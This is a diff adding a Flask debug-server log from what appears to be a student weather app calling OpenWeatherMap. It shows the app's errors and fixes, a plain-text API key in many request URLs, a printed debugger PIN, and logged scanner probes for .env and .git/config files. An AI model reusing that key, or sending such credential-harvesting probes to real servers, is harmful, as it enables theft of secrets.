@@ -1,0 +1,707 @@
+ * Serving Flask app 'main.py'
+ * Debug mode: on
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8080
+ * Running on http://10.128.0.3:8080
+[33mPress CTRL+C to quit[0m
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 158-297-528
+24.184.11.255 - - [11/Feb/2025 18:22:13] "GET /temps HTTP/1.1" 200 -
+24.184.11.255 - - [11/Feb/2025 18:22:32] "GET /temps HTTP/1.1" 200 -
+ * Detected change in '/home/agodbole/csc330/code/weather/activity-4/main.py', reloading
+Success!
+Success!
+Success!
+Success!
+Success!
+Success!
+Success!
+Success!
+Success!
+Success!
+Success!
+Success!
+Success!
+Success!
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 158-297-528
+24.184.11.255 - - [11/Feb/2025 18:25:43] "[35m[1mGET /temps HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/app.py", line 1536, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/app.py", line 1514, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/code/weather/activity-4/main.py", line 33, in show_temps
+    city_temps = read_temps()
+                 ^^^^^^^^^^^^
+  File "/home/agodbole/csc330/code/weather/activity-4/main.py", line 27, in read_temps
+    print ('City: ' + city + ' Temperature: '+ temperature)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: can only concatenate str (not "float") to str
+24.184.11.255 - - [11/Feb/2025 18:25:43] "[36mGET /temps?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 304 -
+24.184.11.255 - - [11/Feb/2025 18:25:43] "[36mGET /temps?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 304 -
+24.184.11.255 - - [11/Feb/2025 18:25:43] "[36mGET /temps?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 304 -
+ * Detected change in '/home/agodbole/csc330/code/weather/activity-4/main.py', reloading
+Success!
+ * Restarting with stat
+Traceback (most recent call last):
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/cli.py", line 961, in run_command
+    app: WSGIApplication = info.load_app()  # pyright: ignore
+                           ^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/cli.py", line 349, in load_app
+    app = locate_app(import_name, name)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/cli.py", line 245, in locate_app
+    __import__(module_name)
+  File "/home/agodbole/csc330/code/weather/activity-4/main.py", line 27
+    print ('City: ' + city + ' Temperature: '+ str((temperature)) 
+          ^
+SyntaxError: '(' was never closed
+ * Debugger is active!
+ * Debugger PIN: 482-193-501
+24.184.11.255 - - [11/Feb/2025 18:26:09] "[35m[1mGET /temps HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/cli.py", line 972, in app
+    raise err from None
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/cli.py", line 961, in run_command
+    app: WSGIApplication = info.load_app()  # pyright: ignore
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/cli.py", line 349, in load_app
+    app = locate_app(import_name, name)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/cli.py", line 245, in locate_app
+    __import__(module_name)
+  File "/home/agodbole/csc330/code/weather/activity-4/main.py", line 27
+    print ('City: ' + city + ' Temperature: '+ str((temperature)) 
+          ^
+SyntaxError: '(' was never closed
+24.184.11.255 - - [11/Feb/2025 18:26:09] "[36mGET /temps?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 304 -
+24.184.11.255 - - [11/Feb/2025 18:26:09] "[36mGET /temps?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 304 -
+24.184.11.255 - - [11/Feb/2025 18:26:09] "[36mGET /temps?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 304 -
+ * Detected change in '/home/agodbole/csc330/code/weather/activity-4/main.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 158-297-528
+24.184.11.255 - - [11/Feb/2025 18:26:36] "GET /temps HTTP/1.1" 200 -
+24.184.11.255 - - [11/Feb/2025 18:26:51] "GET /temps HTTP/1.1" 200 -
+ * Detected change in '/home/agodbole/csc330/code/weather/activity-4/main.py', reloading
+Success!
+City: San diego Temperature: 286.26
+Success!
+City: New York Temperature: 274.35
+Success!
+City: Miami Temperature: 300.12
+Success!
+City: Las Vegas Temperature: 286.75
+Success!
+City: Seattle Temperature: 272.28
+Success!
+City: Denver Temperature: 262.57
+Success!
+City: New Haven Temperature: 272.61
+Success!
+City: San diego Temperature: 286.26
+Success!
+City: New York Temperature: 274.35
+Success!
+City: Miami Temperature: 300.12
+Success!
+City: Las Vegas Temperature: 286.75
+Success!
+City: Seattle Temperature: 272.28
+Success!
+City: Denver Temperature: 262.57
+Success!
+City: New Haven Temperature: 272.61
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 158-297-528
+24.184.11.255 - - [11/Feb/2025 18:27:48] "[35m[1mGET /temps HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/app.py", line 1536, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/app.py", line 1514, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/.venv/lib/python3.11/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/agodbole/csc330/code/weather/activity-4/main.py", line 34, in show_temps
+    city_temps = read_temps()
+                 ^^^^^^^^^^^^
+  File "/home/agodbole/csc330/code/weather/activity-4/main.py", line 28, in read_temps
+    logger.debug ('City: ' + city + ' Temperature: '+ str(temperature))
+NameError: name 'logger' is not defined
+24.184.11.255 - - [11/Feb/2025 18:27:48] "[36mGET /temps?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 304 -
+24.184.11.255 - - [11/Feb/2025 18:27:48] "[36mGET /temps?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 304 -
+24.184.11.255 - - [11/Feb/2025 18:27:49] "[36mGET /temps?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 304 -
+ * Detected change in '/home/agodbole/csc330/code/weather/activity-4/main.py', reloading
+Success!
+ * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 158-297-528
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=San+diego HTTP/1.1" 200 533
+DEBUG:main:City: San diego Temperature: 286.26
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=New+York HTTP/1.1" 200 512
+DEBUG:main:City: New York Temperature: 274.35
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Miami HTTP/1.1" 200 525
+DEBUG:main:City: Miami Temperature: 300.12
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Las+Vegas HTTP/1.1" 200 522
+DEBUG:main:City: Las Vegas Temperature: 286.75
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Seattle HTTP/1.1" 200 509
+DEBUG:main:City: Seattle Temperature: 272.28
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Denver HTTP/1.1" 200 527
+DEBUG:main:City: Denver Temperature: 262.57
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=New+Haven HTTP/1.1" 200 511
+DEBUG:main:City: New Haven Temperature: 272.61
+INFO:werkzeug:24.184.11.255 - - [11/Feb/2025 18:28:36] "GET /temps HTTP/1.1" 200 -
+ERROR:werkzeug:80.82.68.18 - - [11/Feb/2025 18:28:54] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:80.82.68.18 - - [11/Feb/2025 18:28:54] "[31m[1m\x16\x03\x01\x00þ\x01\x00\x00ú\x03\x03|\x8a©xjàNvÄ\x9aCªJä÷­j\x0b§\x0dûÒ Üæ¤þn\x95¬×s ¤ \x8bQé^ö,HSw'N9v\\ÃÓ#fÛ¦ÆWÒs\x15¤Ñ\x9a\x13W\x002À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+ERROR:werkzeug:80.82.68.18 - - [11/Feb/2025 18:28:55] code 400, message Bad request syntax ("\x16\x03\x01\x00à\x01\x00\x00Ü\x03\x03[ãÄ\x9d¡¾&éT\x8eõ|\x91\x9bÄ.¤³È\x13S_\x9aó··n\x18\xad*{\x8a\x00\x00h\x008\x00j\x00¢\x00gÀ\x07\x00£À\x08\x00\x08À'\x00k\x00\x9e\x00\x03\x00@À+\x00\x9fÀ")
+INFO:werkzeug:80.82.68.18 - - [11/Feb/2025 18:28:55] "[31m[1m\x16\x03\x01\x00à\x01\x00\x00Ü\x03\x03[ãÄ\x9d¡¾&éT\x8eõ|\x91\x9bÄ.¤³È\x13S_\x9aó··n\x18­*{\x8a\x00\x00h\x008\x00j\x00¢\x00gÀ\x07\x00£À\x08\x00\x08À'\x00k\x00\x9e\x00\x03\x00@À+\x00\x9fÀ[0m" 400 -
+ERROR:werkzeug:80.82.68.18 - - [11/Feb/2025 18:28:56] code 400, message Bad request version ("\x17!Ó\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+INFO:werkzeug:80.82.68.18 - - [11/Feb/2025 18:28:56] "[31m[1m\x16\x03\x01\x00Ô\x01\x00\x00Ð\x03\x03P{\x99Þ\x13¸E\x86È\x17w_I\x0dJ´Çù½¢L\x03­\x17XÒÄ\x87 \x17!Ó\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ[0m" 400 -
+ERROR:werkzeug:80.82.68.18 - - [11/Feb/2025 18:28:58] code 400, message Bad request syntax ('RPIVOT')
+INFO:werkzeug:80.82.68.18 - - [11/Feb/2025 18:28:58] "[31m[1mRPIVOT[0m" 400 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=San+diego HTTP/1.1" 200 533
+DEBUG:main:City: San diego Temperature: 286.26
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=New+York HTTP/1.1" 200 512
+DEBUG:main:City: New York Temperature: 274.35
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Miami HTTP/1.1" 200 525
+DEBUG:main:City: Miami Temperature: 300.12
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Las+Vegas HTTP/1.1" 200 522
+DEBUG:main:City: Las Vegas Temperature: 286.75
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Seattle HTTP/1.1" 200 509
+DEBUG:main:City: Seattle Temperature: 272.28
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Denver HTTP/1.1" 200 527
+DEBUG:main:City: Denver Temperature: 262.57
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=New+Haven HTTP/1.1" 200 511
+DEBUG:main:City: New Haven Temperature: 272.61
+INFO:werkzeug:24.184.11.255 - - [11/Feb/2025 18:29:06] "GET /temps HTTP/1.1" 200 -
+INFO:werkzeug:179.43.160.138 - - [11/Feb/2025 18:30:54] "[33mGET / HTTP/1.1[0m" 404 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=San+diego HTTP/1.1" 200 532
+DEBUG:main:City: San diego Temperature: 286.48
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=New+York HTTP/1.1" 200 512
+DEBUG:main:City: New York Temperature: 274.35
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Miami HTTP/1.1" 200 525
+DEBUG:main:City: Miami Temperature: 300.12
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Las+Vegas HTTP/1.1" 200 522
+DEBUG:main:City: Las Vegas Temperature: 286.75
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Seattle HTTP/1.1" 200 509
+DEBUG:main:City: Seattle Temperature: 272.28
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Denver HTTP/1.1" 200 527
+DEBUG:main:City: Denver Temperature: 262.57
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=New+Haven HTTP/1.1" 200 511
+DEBUG:main:City: New Haven Temperature: 272.61
+INFO:werkzeug:24.184.11.255 - - [11/Feb/2025 18:31:15] "GET /temps HTTP/1.1" 200 -
+INFO:werkzeug:185.224.0.201 - - [11/Feb/2025 18:55:43] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:80.64.30.118 - - [11/Feb/2025 19:13:57] code 400, message Bad request syntax ('\x16\x03\x03\x00\x8e\x01\x00\x00\x8a\x03\x03g«¡uÞG ')
+INFO:werkzeug:80.64.30.118 - - [11/Feb/2025 19:13:57] "[31m[1m\x16\x03\x03\x00\x8e\x01\x00\x00\x8a\x03\x03g«¡uÞG [0m" 400 -
+ERROR:werkzeug:80.64.30.118 - - [11/Feb/2025 19:13:57] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x03\x00\x8e\x01\x00\x00\x8a\x03\x03g«¡u·Ü(¤\x95¬½\x99\x86ÜL\x07=')
+INFO:werkzeug:80.64.30.118 - - [11/Feb/2025 19:13:57] "[31m[1m\x16\x03\x03\x00\x8e\x01\x00\x00\x8a\x03\x03g«¡u·Ü(¤\x95¬½\x99\x86ÜL\x07= °¤brÛû\x15Ä\x7f'§Á¢Ì\x00\x00*À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À[0m" 400 -
+ERROR:werkzeug:80.64.30.118 - - [11/Feb/2025 19:13:57] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x03\x00\x8e\x01\x00\x00\x8a\x03\x03g«¡uRØ2ÁÁ')
+INFO:werkzeug:80.64.30.118 - - [11/Feb/2025 19:13:57] "[31m[1m\x16\x03\x03\x00\x8e\x01\x00\x00\x8a\x03\x03g«¡uRØ2ÁÁ\x0bi#7$,\x86ï\x82°$xµ§Mæö|=rYþQ\x00\x00*À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À[0m" 400 -
+ERROR:werkzeug:80.64.30.118 - - [11/Feb/2025 19:13:57] code 400, message Bad request version ("dù)Ê#æ\x00\x00*À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À")
+INFO:werkzeug:80.64.30.118 - - [11/Feb/2025 19:13:57] "[31m[1m\x16\x03\x03\x00\x8e\x01\x00\x00\x8a\x03\x03g«¡u\x1aÑ<6I\x02/)s<| \x828B\x9b~dYÊ\x8c\x0ddù)Ê#æ\x00\x00*À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À[0m" 400 -
+INFO:werkzeug:48.217.211.229 - - [11/Feb/2025 19:29:58] "[33mGET /actuator/health HTTP/1.1[0m" 404 -
+ERROR:werkzeug:165.154.12.9 - - [11/Feb/2025 19:45:04] code 400, message Bad request version ('\x00\x9eÌ¨Ìª\x003\x00=\x00\x16À')
+INFO:werkzeug:165.154.12.9 - - [11/Feb/2025 19:45:04] "[31m[1m\x16\x03\x01\x01\x17\x01\x00\x01\x13\x03\x03E\x97/íwÂVr<¿\x19S\x94+n®i=,\x9f&Ï9F9:¥\x8a\x0c{oð *ëy¾êÕ\x98\x16«¨åòé¸CLaaðæ9+VÀô0ý\x1c}Ê¡·\x004Ì¨Ì©À/À0À+À,À\x09\x00\x9eÌ¨Ìª\x003\x00=\x00\x16À[0m" 400 -
+INFO:werkzeug:165.154.12.9 - - [11/Feb/2025 19:45:17] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:165.154.12.9 - - [11/Feb/2025 19:45:19] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:165.154.12.9 - - [11/Feb/2025 19:45:20] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:165.154.12.9 - - [11/Feb/2025 19:45:22] "[33mGET /sitemap.xml HTTP/1.1[0m" 404 -
+ERROR:werkzeug:45.79.128.205 - - [11/Feb/2025 19:50:27] code 400, message Bad request syntax ('\x16\x03\x01\x01')
+INFO:werkzeug:45.79.128.205 - - [11/Feb/2025 19:50:27] "[31m[1m\x16\x03\x01\x01[0m" 400 -
+ERROR:werkzeug:45.79.128.205 - - [11/Feb/2025 19:50:27] code 400, message Bad request syntax ('\x16\x03\x01\x01')
+INFO:werkzeug:45.79.128.205 - - [11/Feb/2025 19:50:27] "[31m[1m\x16\x03\x01\x01[0m" 400 -
+ERROR:werkzeug:45.79.137.13 - - [11/Feb/2025 19:51:07] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:45.79.137.13 - - [11/Feb/2025 19:51:07] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x18º\x16\x98\x1a°\x01Þ$\x056\x9e»\x05Æ\x81Q\x98§æ\x1eJÚ×D,%YÈX\x94\x04 \x7fèV¢ý\x11ß\x86¥7î\x8fÃC]>CAMCRt«\x97é\x0b1iØÎ:x\x00&Ì©Ì¨À+À/À,À0À\x09À\x13À[0m" 400 -
+INFO:werkzeug:206.168.34.67 - - [11/Feb/2025 19:54:47] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:206.168.34.67 - - [11/Feb/2025 19:54:57] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:206.168.34.67 - - [11/Feb/2025 19:55:00] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:206.168.34.67 - - [11/Feb/2025 19:55:00] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+ERROR:werkzeug:206.168.34.199 - - [11/Feb/2025 20:24:40] code 400, message Bad request syntax ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03-"\x01')
+INFO:werkzeug:206.168.34.199 - - [11/Feb/2025 20:24:40] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03-"\x01[0m" 400 -
+ERROR:werkzeug:206.168.34.199 - - [11/Feb/2025 20:25:26] code 400, message Bad request syntax ('ZG\x00\x00\x00\x05\x00+\x0e\x01\x00')
+INFO:werkzeug:206.168.34.199 - - [11/Feb/2025 20:25:26] "[31m[1mZG\x00\x00\x00\x05\x00+\x0e\x01\x00[0m" 400 -
+ERROR:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:31] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:31] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03);-¡:\x89BLº\x13À)5¯ÄÚ\x85Ã¢\x06>OÈq\x03>°CE/\x8eB Êà\x0b/PCgS¤\x8dÅó>S\x10ª\x94ñTei¾\x0fyñ\x15Å\x7f^\x95Èd\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:31] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:32] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:33] "[33mGET /configuration/.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:33] "[33mGET /.env.uat HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:34] "[33mGET /project/.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:34] "[33mGET /.env.save HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:35] "[33mGET /.env.stage HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:35] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:35] "[33mGET /app/.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:36] "[33mGET /files/.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:36] "[33mGET /.env.bak HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:37] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:38] "[33mGET /.env.preprod HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:38] "[33mGET /core/.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:39] "[33mGET /dev/.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:39] "[33mGET /.env.backup HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:40] "[33mGET /.env.live HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.148.10.90 - - [11/Feb/2025 20:48:40] "[33mGET /.env.dist HTTP/1.1[0m" 404 -
+INFO:werkzeug:177.197.68.19 - - [11/Feb/2025 21:26:52] "[33mGET /script HTTP/1.1[0m" 404 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=San+diego HTTP/1.1" 200 513
+DEBUG:main:City: San diego Temperature: 287
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=New+York HTTP/1.1" 200 514
+DEBUG:main:City: New York Temperature: 274.53
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Miami HTTP/1.1" 200 516
+DEBUG:main:City: Miami Temperature: 299.36
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Las+Vegas HTTP/1.1" 200 520
+DEBUG:main:City: Las Vegas Temperature: 290.07
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Seattle HTTP/1.1" 200 509
+DEBUG:main:City: Seattle Temperature: 275.03
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=Denver HTTP/1.1" 200 525
+DEBUG:main:City: Denver Temperature: 263.59
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): api.openweathermap.org:80
